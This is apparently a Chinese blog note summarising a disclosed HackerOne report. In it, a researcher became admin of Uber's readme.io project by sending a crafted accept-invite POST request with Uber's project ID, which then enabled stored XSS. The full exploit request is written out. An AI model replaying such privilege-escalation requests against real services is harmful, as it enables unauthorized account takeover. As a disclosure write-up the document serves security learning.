# 漏洞散记
##  Uber的Xss第三弹
> 很有趣的XSS三连弹，作者分别在April，June,August提交了三次XSS，且完全利用在同一个地方，然而
就是通过了审查，并分别赚取了$3,000，$7,500，$5,000，简直无情，而且漏洞提交厂商是Uber，但实际影响最大
的却是另一个厂家:**readme.io**


> 漏洞价值:5000$

>源地址:[#152067](https://hackerone.com/reports/152067)

## 漏洞过程

> 只能说，这最后的漏洞是**真.越权**

同样还是在**readme.io**上找茬，**https://uber.readme.io/inactive**页面，不知道为什么，**readme**
将项目的ID号显示在了页面源代码里。(注:现在已经修复了，源码里看不到了)

### 关键点

作者通过访问Uber的项目找到了项目ID：**grab Uber's project ID from the source: 578cd33dc27ce20e004e397b**

![id](https://hackerone-attachments.s3.amazonaws.com/production/000/105/894/49e867fc0eab15cdc8a9503ac14745f0f786b5b3/uberid.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAJFXIS7KJADBA4QQA%2F20161209%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20161209T042901Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=08f1784040c60f3600e9764cc6a39f44cc3e94ab7d5bf54048ce510d767e4227)

作者创建了一个新的**readme**用户，然后构造了如下的Post请求:

```
POST /api/accept-invite/5617f98f7f74330d00dfd86d HTTP/1.1
Host: dash.readme.io
Connection: close
Content-Length: 2
Accept: application/json, text/plain, /
X-NewRelic-ID: XQEHWF5UGwYHXVlSDgY=
Origin: https://dash.readme.io
X-XSRF-TOKEN:<your token here>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
DNT: 1
Referer: https://dash.readme.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Cookie: <your cookies here>
```
Cookie是新用户的cookie，然而请求的Project-ID却是Uber的ID
(这个包是正常业务流程中会出现的)

返回包虽然是
```
"Invite doesn't exist"
```
但是当你再次访问**dash.readme.io**时，会发先你已经是Uber的管理员了，然后就能在前端插代码了，所以才
提交为**Stored Xss**

![admin](https://hackerone-attachments.s3.amazonaws.com/production/000/105/638/d6adda47b831f3d460f11aa44d6822f02c353095/dash.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAJFXIS7KJADBA4QQA%2F20161209%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20161209T042901Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=0e869bef15037548ee6a66d2bdfae0336646c283ff47a0554a1a75b9d6d171c6)

### 结语
很尴尬，三连弹结束后。Uber不再使用readme了，而对于第三弹，我只能说这个越权越的我很服，而对于XSS，我也很庆幸学到了一种新的攻击技术
个人感觉，三连弹中第二弹的思路最为强悍，而第一弹的干货比较好，至于第三弹则相形见绌了
